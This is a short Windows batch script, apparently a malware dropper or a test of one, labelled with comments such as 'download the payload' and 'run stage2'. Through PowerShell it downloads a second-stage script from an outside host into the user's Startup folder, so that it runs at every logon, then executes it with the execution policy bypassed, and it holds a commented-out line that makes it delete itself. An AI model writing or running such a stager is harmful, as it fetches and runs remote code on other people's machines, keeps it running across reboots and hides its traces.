
@REM @echo off

SET currentDirectory=%cd%

SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %STARTUPPATH%

SET DOWNLOADPATH="C:\malware\test"

@REM download the payload
powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/popup.cmd' -OutFile 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'

@REM run stage2
powershell -ExecutionPolicy Bypass -Command "& 'C:\Users\Arth\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'"


@REM cd %currentDirectory%

@rem uncomment to make the script delete itself
@rem del initial.bat

